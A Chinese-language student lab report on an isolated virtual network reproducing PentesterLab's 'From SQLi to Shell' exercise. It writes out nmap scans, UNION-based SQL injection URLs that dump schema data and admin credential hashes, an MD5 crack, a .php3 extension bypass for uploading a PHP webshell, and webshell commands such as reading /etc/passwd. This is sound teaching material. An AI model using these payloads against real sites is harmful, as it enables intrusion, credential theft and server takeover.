# SQL注入 Webshell

## 1. 实验目的

在PHP搭建的网站中利用网站的SQL漏洞，实现SQL注入，以管理员的身份登录后对网页进行修改，并在目标服务器中获得代码执行。

所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。

## 2、 实验环境

### 2.1 网络配置

在某些特殊的网络调试环境中，要求将真实环境和虚拟环境隔离开，这时就可采用Host-only模式。（如果想要在Host-only模式下联网，可以将联网的主机的网卡共享给主机的虚拟网卡，从而实现虚拟机联网）

将攻击者主机KaliAttack和受害者主机DebianTarget都设置为Host-only网络

![2](/ns-0x07/2.jpg)

![3](/ns-0x07/3.jpg)

### 2.2 网卡信息

KaliAttack攻击者主机为 192.168.68.4

DebianTarget受害者主机 192.168.68.3

![4](/ns-0x07/4.jpg)



![5](/ns-0x07/5.jpg)

### 2.3 查看攻击者主机可攻击服务器范围

> nmap默认发送一个ARP的PING数据包，来探测目标主机1-10000范围内所开放的所有端口

```nmap -sP 192.168.68.0/24```确认受害者主机在攻击者主机可攻击范围内

![6](/ns-0x07/6.jpg)

```nmap -A 192.168.68.3``` 对受害者主机进行端口扫描,确认受害者主机的 HTTP 服务」可以被正常访问；

![7](/ns-0x07/7.jpg)

## 3、 实验测试

### 3.1 浏览器访问网页

浏览器访问`192.168.68.3`

![9](/ns-0x07/9.jpg)

查看网页源码，看到很多PHP链接，推测后台极大可能性使用的是PHP（不排除Web 服务器通过 URI 映射配置「欺骗」攻击者的可能性）

![10](/ns-0x07/10.jpg)

### 3.2 分析php连接

`cat.php?id=x`  : 假设该 URL 对应的后台 SQL 语句为```SELECT * FROM cat WHERE id=x```

### 3.3 在实验页面进行测试

```all.php ```显示全部三张图片

![14](/ns-0x07/14.jpg)

 `cat.php?id=1`  会显示两张图片

![11](/ns-0x07/11.jpg)

`cat.php?id=2`  会显示一张图片

![12](/ns-0x07/12.jpg)

`cat.php?id=3`  没有图片显示

![13](/ns-0x07/13.jpg)

```admin/login.php```  是一个登录界面

![15](/ns-0x07/15.jpg)

通过测试可以得知，网页存在SQL注入漏洞。我们可以找到漏洞，在数据库中查找到用于用户登录的用户名和密码。

## 4、 实验过程

### 4.1 寻找SQL注入点

[寻找SQL 注入点有两个方法](https://jingyan.baidu.com/article/219f4bf73e8fa9de442d38c0.html)：

#### 4.1.1 “加引号”法 

　　在浏览器地址栏中的页面链接地址后面增加一个单引号，如下所示：

　　http://www.xxx.com/xxx.asp?id=YY’

　　然后访问该链接地址，浏览器可能会返回类似于下面的错误提示信息：Microsoft JET Database Engine 错误’80040e14’。字符串的语法错误在查询表达式’ID=YY’中。

![16](/ns-0x07/16.jpg)

#### 4.1.2 “1=1和1=2”法 

　　“加引号”法很直接，也很简单，但是对SQL注入有一定了解的程序员在编写程序时，都会将单引号过滤掉。如果再使用单引号测试，就无法检测到注入点了。这时，就可以使用经典的“1=1和1=2”法进行检测。

　　如果正常页面链接地址为：```http://www.xxx.com/xxx.asp?id=YY ```，在浏览器中分别输入以下两个链接地址，分别查看它们返回的结果值。

　　Ø``` http://www.xxx.com/xxx.asp?id=YY and 1=1```

　　Ø``` http://www.xxx.com/xxx.asp?id=YY and 1=2```

　　如果存在注入点的话，浏览器将会分别显示为：

　　Ø 正常显示，内容与正常页面显示的结果基本相同。

　　Ø 提示BOF或EOF(程序没做任何判断时)，或提示找不到记录，或显示内容为空(程序加了on error resume next)

![17](/ns-0x07/17.jpg)

![18](/ns-0x07/18.jpg)

### 4.2 利用UNION关键字进行SQL注入

#### 4.2.1 猜测数据库UNION数

从UNION=1开始进行猜测：```http://192.168.68.3/cat.php?id=1%20UNION%20SELECT%201```

![19](/ns-0x07/19.jpg)

依次猜测UNION=2，3……发现当UNION=4的时候有图片显示，且出现了之前没有出现的```picture：2```，**我们可以将后续查找中的输出内容放在这个位置。**当UNION=5的时候没有图片显示。

![20](/ns-0x07/20.jpg)

![23](/ns-0x07/23.jpg)

综上，使用union select 1, 2, 3 ... 来关联页面上哪些位置上的数据对应来自于当前 SQL 查询返回结果的第几个字段。通过这种 union 查询技巧可以枚举猜解出当前 SQL 查询对应的返回结果集合的列字段数量为4；

#### 4.2.2 替换列值

在3.2.1中，当我们猜测列值的时候，发现UNION=4时，多了```picture：2```部分，所以我们进一步推测第二列可以利用，作为SQL注入点。

1）查看版本信息```http://192.168.68.3/cat.php?id=1 UNION SELECT 1,@@version,3,4```

![24](/ns-0x07/24.jpg)

2）查看当前用户信息```http://192.168.68.3/cat.php?id=1 UNION SELECT 1,current_user(),3,4```

![25](/ns-0x07/25.jpg)

3）查看数据库信息```http://192.168.68.3/cat.php?id=1 UNION SELECT 1,database(),3,4```

![26](/ns-0x07/26.jpg)

4）查看所有表的列表```http://192.168.68.3/cat.php?id=1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables```

![27](/ns-0x07/27.jpg)

5）查看所有列的列表	```http://192.168.68.3/cat.php?id=1 UNION SELECT 1,column_name,3,4 FROM information_schema.columns```

![32](/ns-0x07/32.jpg)

6）连接表和列。在user表中看到有用户和密码列。```http://192.168.68.3/cat.php?id=1 UNION SELECT 1,concat(table_name,':', column_name),3,4 FROM information_schema.columns```

![33](/ns-0x07/33.jpg)

#### 4.2.3 破解管理员登录密码

1. 获取管理员登录密码 ```192.168.68.3/cat.php?id=0 UNION SELECT 1,concat(id,':',login,':',password),3,4 FROM users```

![34](/ns-0x07/34.jpg)

2. 网页在线破解 搜索 ```MD5 8efe310f9ab3efeae8d410a8e0166eb2```

![35](/ns-0x07/35.jpg)

### 4.3 登录管理员账号

用破解得到的用户名及密码登录管理员账号

![36](/ns-0x07/36.jpg)

![39](/ns-0x07/39.jpg)

## 5、 webshell 实验

### 5.1 提交PHP文件

发现可以提交文件，我们使用管理员用户上传构建的webshell

![38](/ns-0x07/8.jpg)

> webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。

我们尝试构建用于上传的webshell,命名为web.php,并提交，发现PHP文件被过滤掉。

![41](/ns-0x07/41.jpg)

![40](/ns-0x07/40.jpg)

 ![42](/ns-0x07/42.jpg)

修改文件后缀名为 .php3,成功提交。

> .php3 能被当作 PHP 文件解释执行，是因为目标 [Apache 服务器配置缺陷](http://php.net/manual/zh/install.unix.apache2.php)

![47](/ns-0x07/47.jpg)

![46](/ns-0x07/46.jpg)

### 5.2 测试WebShell

使用测试脚本cmd运行命令

 1）查看内核：```http://192.168.68.3/admin/uploads/web.php3?cmd=uname```

![45](/ns-0x07/45.jpg)

2）查看当前目录内容：```http://192.168.68.3/admin/uploads/web.php3?cmd=ls -u```

![48](/ns-0x07/48.jpg)

3）获取靶机系统用户列表:```192.168.68.3/admin/uploads/web.php3?cmd=cat /etc/passwd```

![49](/ns-0x07/49.jpg)

6、 参考

[from_sqli_to_shell/course](https://pentesterlab.com/exercises/from_sqli_to_shell/course)

[**2018-NS-Public-jckling**](https://github.com/CUCCS/2018-NS-Public-jckling/blob/0aacd954db698f695fcd4d37ebde76f579df1160/ns-0x07/实验报告.md)

[**2018-NS-Public-xaZKX**](https://github.com/CUCCS/2018-NS-Public-xaZKX/pull/5)

